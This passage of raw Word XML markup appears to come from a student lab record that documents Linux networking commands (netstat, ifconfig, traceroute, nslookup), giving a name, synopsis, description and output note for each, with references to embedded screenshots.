          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> netstat [OPTION]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E944E87" w14:textId="77777777" w:rsidR="00FA09E1" w:rsidRPr="00FA09E1" w:rsidRDefault="00FA09E1" w:rsidP="00FA09E1">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA09E1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA09E1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays network connections, routing tables, interface statistics, and listening ports. This command may require installing the net-tools package.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A9587A8" w14:textId="77777777" w:rsidR="00FA09E1" w:rsidRPr="00FA09E1" w:rsidRDefault="00FA09E1" w:rsidP="00FA09E1">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA09E1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA09E1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays network statistics and connection information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B22970" w14:textId="27C53C14" w:rsidR="00D83D4D" w:rsidRDefault="003B308F" w:rsidP="00D83D4D">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="549E96CB" wp14:editId="630BC72E">
            <wp:extent cx="5731510" cy="2699385"/>
            <wp:effectExtent l="0" t="0" r="2540" b="5715"/>
            <wp:docPr id="94564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22"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2699385"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="623DD38D" w14:textId="77777777" w:rsidR="003B308F" w:rsidRDefault="003B308F" w:rsidP="00D83D4D">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5896BD88" w14:textId="77777777" w:rsidR="003B308F" w:rsidRPr="003B308F" w:rsidRDefault="003B308F" w:rsidP="003B308F">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B308F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>18. ifconfig</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F1F21C" w14:textId="77777777" w:rsidR="003B308F" w:rsidRPr="003B308F" w:rsidRDefault="003B308F" w:rsidP="003B308F">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B308F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="003B308F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> ifconfig - displays network interface configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E1DEA2" w14:textId="77777777" w:rsidR="003B308F" w:rsidRPr="003B308F" w:rsidRDefault="003B308F" w:rsidP="003B308F">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B308F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="003B308F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> ifconfig [INTERFACE]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1126CB1D" w14:textId="77777777" w:rsidR="003B308F" w:rsidRPr="003B308F" w:rsidRDefault="003B308F" w:rsidP="003B308F">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B308F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="003B308F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays or configures network interfaces, including their IP addresses, netmasks, and interface status. It is a legacy command and may require installing the net-tools package.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="102BE246" w14:textId="77777777" w:rsidR="003B308F" w:rsidRDefault="003B308F" w:rsidP="003B308F">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D2C73E0" w14:textId="77777777" w:rsidR="003B308F" w:rsidRDefault="003B308F" w:rsidP="003B308F">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EFE3A93" w14:textId="0348A5DD" w:rsidR="003B308F" w:rsidRPr="003B308F" w:rsidRDefault="003B308F" w:rsidP="004544F7">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B308F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="003B308F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the configuration details of the specified network interface or all available interfaces.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CA33AF" w14:textId="6D7DDF2F" w:rsidR="003B308F" w:rsidRDefault="004544F7" w:rsidP="00D83D4D">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="10E7F794" wp14:editId="2E1192A7">
            <wp:extent cx="5731510" cy="2997200"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="947180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23"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2997200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A6190FD" w14:textId="77777777" w:rsidR="004544F7" w:rsidRDefault="004544F7" w:rsidP="00D83D4D">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="702B8AC5" w14:textId="77777777" w:rsidR="00490C55" w:rsidRPr="00490C55" w:rsidRDefault="00490C55" w:rsidP="00490C55">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00490C55">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>19. traceroute</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5177982F" w14:textId="77777777" w:rsidR="00490C55" w:rsidRPr="00490C55" w:rsidRDefault="00490C55" w:rsidP="00490C55">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00490C55">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00490C55">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> traceroute - displays the packet route to the destination.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74161D36" w14:textId="77777777" w:rsidR="00490C55" w:rsidRPr="00490C55" w:rsidRDefault="00490C55" w:rsidP="00490C55">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00490C55">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00490C55">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> traceroute &lt;hostname/IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6B8E2A" w14:textId="77777777" w:rsidR="00490C55" w:rsidRPr="00490C55" w:rsidRDefault="00490C55" w:rsidP="00490C55">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00490C55">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00490C55">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Traces the path taken by packets from the Linux system to the specified destination by identifying intermediate routers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C39AA50" w14:textId="77777777" w:rsidR="00490C55" w:rsidRPr="00490C55" w:rsidRDefault="00490C55" w:rsidP="00490C55">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00490C55">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00490C55">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the intermediate routers and their response times along the route.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FD32853" w14:textId="788DB9FB" w:rsidR="004544F7" w:rsidRDefault="00DE69C6" w:rsidP="00D83D4D">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7024C9B1" wp14:editId="4E5A80B6">
            <wp:extent cx="5125085" cy="581025"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="21352478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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5125085" cy="581025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D26B13" w14:textId="77777777" w:rsidR="00DE69C6" w:rsidRDefault="00DE69C6" w:rsidP="00D83D4D">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6040E904" w14:textId="205E38C1" w:rsidR="00C2706C" w:rsidRPr="00C2706C" w:rsidRDefault="00C2706C" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>20</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2706C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>. nslookup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3538210F" w14:textId="77777777" w:rsidR="00C2706C" w:rsidRPr="00C2706C" w:rsidRDefault="00C2706C" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2706C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2706C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> nslookup - retrieves DNS information for a domain.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455917C9" w14:textId="77777777" w:rsidR="00C2706C" w:rsidRPr="00C2706C" w:rsidRDefault="00C2706C" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2706C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2706C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> nslookup &lt;domain&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F263F9" w14:textId="77777777" w:rsidR="00C2706C" w:rsidRPr="00C2706C" w:rsidRDefault="00C2706C" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2706C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2706C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Queries the Domain Name System (DNS) to retrieve information about a specified domain name or IP address.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF1F4CA" w14:textId="77777777" w:rsidR="00C2706C" w:rsidRPr="00C2706C" w:rsidRDefault="00C2706C" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2706C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2706C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the DNS server used and the corresponding DNS query results.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6348BF19" w14:textId="5E29E543" w:rsidR="00C2706C" w:rsidRDefault="00C2706C" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13AD6F4B" w14:textId="77777777" w:rsidR="00C2706C" w:rsidRDefault="00C2706C" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
